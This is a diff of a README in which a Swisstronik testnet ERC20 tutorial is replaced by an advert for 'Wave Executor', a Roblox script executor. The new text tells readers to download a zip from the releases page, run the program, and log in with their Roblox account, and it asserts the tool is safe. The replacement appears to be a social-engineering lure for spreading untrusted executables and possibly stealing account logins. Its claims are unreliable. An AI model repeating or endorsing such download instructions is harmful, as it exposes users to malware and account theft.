@@ -1,112 +1,49 @@
-# Swisstronik Tesnet Techinal Task 2
+# 🚀 Wave Executor – Your Ultimate Roblox Script Executor  
+[![Download More Scripts](https://img.shields.io/badge/Download-More%20Scripts-blueviolet)](https://github.com/topics/robloxscripts)
 
-link : [Click!](https://www.swisstronik.com/testnet2/dashboard)
+## 📥 Getting Started  
+Getting up and running with **Wave Executor** is quick and simple:  
+1. [![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](../../releases)  
+2. Extract the `.zip` archive to any folder you prefer.
 
-Feel free donate to my EVM address
+## 📌 What is Wave Executor?  
+**Wave Executor** is a powerful, easy-to-use **Roblox script executor** designed for performance, reliability, and user convenience. It keeps pace with Roblox updates, making it perfect for players, developers, and modders looking to unlock new possibilities in their gameplay.
 
-EVM :
+![Preview](/assets/Wave.jpg)
 
-```bash
-0x9902C3A98Df4b240ad5496cC26F89bAb8058f4aE
-```
+## 📑 Table of Contents  
+- [Introduction](#-introduction)  
+- [Features](#-features)  
+- [Getting Started](#-getting-started)  
+- [How to Use](#-how-to-use)  
+- [Contribute](#-contribute)  
+- [License](#license)  
+- [Contact](#-contact)
 
-## Steps
+## 🎮 Introduction  
+Welcome to **Wave Executor**, your reliable solution for running Roblox scripts efficiently. Whether you're customizing gameplay, testing new ideas, or building your own mods, **Wave** is designed to empower your creativity and enhance your Roblox experience.
 
-### 1. Clone Repository
+## ✨ Features  
+What makes **Wave Executor** stand out?  
+- ⚙️ **High-Level Script Execution:** Supports complex and advanced scripts.  
+- 🚀 **Optimized for Speed:** Runs scripts with minimal lag.  
+- 🧭 **User-Friendly Interface:** Clean and intuitive design.  
+- 🛡️ **Safe & Stable:** Built with user safety and stability in mind.  
+- 🔄 **Frequent Updates:** Always compatible with the latest Roblox patches.  
 
-```bash
-git clone https://github.com/Mnuralim/swisstronik-erc20-mint-token.git
-```
+## 🚀 How to Use  
+To get started with **Wave Executor**, follow these steps:  
+1. Launch **Wave Executor** from the extracted folder.  
+2. **Log In (if required):** Use your Roblox account for access.  
+3. **Load a Script:** Import or write your desired script.  
+4. **Execute:** Press the execute button to run the script in-game.  
+5. **Customize:** Enhance your Roblox session however you like.
 
-```
-cd swisstronik-erc20-mint-token
-```
+## 🤝 Contribute  
+We welcome community input!  
+Feel free to open issues for bugs, suggest improvements, or submit pull requests. Your contributions help make **Wave Executor** better for everyone.
 
-### 2. Install Dependency
-
-```bash
-npm install
-```
-
-### 3. Set .env File
-
-create .env file in root project
-
-```bash
-PRIVATE_KEY="your private key"
-```
-
-### 4. Create Smart Contract
-
-- Open contract folder
-- Create Token.sol file
-- Copy this code and paste there
-- Feel free to modify token name and token symbol
-
-```
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
-
-contract TestToken is ERC20 {
-    constructor()ERC20("IzzyToken","IZZY"){}
-
-    function mint1000tokens() public {
-        _mint(msg.sender,1000*10**18);
-    }
-
-    function burn1000tokens() public{
-        _burn(msg.sender,1000*10**18);
-    }
-
-}
-```
-
-### 5. Compile Smart Contract
-
-```bash
-npm run compile
-```
-
-### 6. Deploy Smart Contract
-
-```bash
-npm run deploy
-```
-
-### 7. Mint Token
-
-```bash
-npm run mint
-```
-
-### 8. Check Supply
-
-```bash
-npm run check-supply
-```
-
-### 9. Check Balance
-
-```bash
-npm run balance-of
-```
-
-### 10. Tranfer Token
-
-```bash
-npm run transfer
-```
-
-### 11. Finsihed
-
-- Open the deployed-adddress.ts (location in utils folder)
-- Copy the address and paste the address in testnet dashboard
-- push this project to your github and paste your repository link in testnet dashboard
-
-by :
-github : [Mnuralim](https://github.com/Mnuralim)
-twitter : @Izzycracker04
-telegram : @fitriay19
-//0x37401D115bC52bBdaa59Df7f7e021523b020F98f
+## 📢 Contact  
+Need assistance or want to stay updated?  
+Join our **[official Discord server](https://discord.gg/Wave)** for support, news, and community discussions.
+    
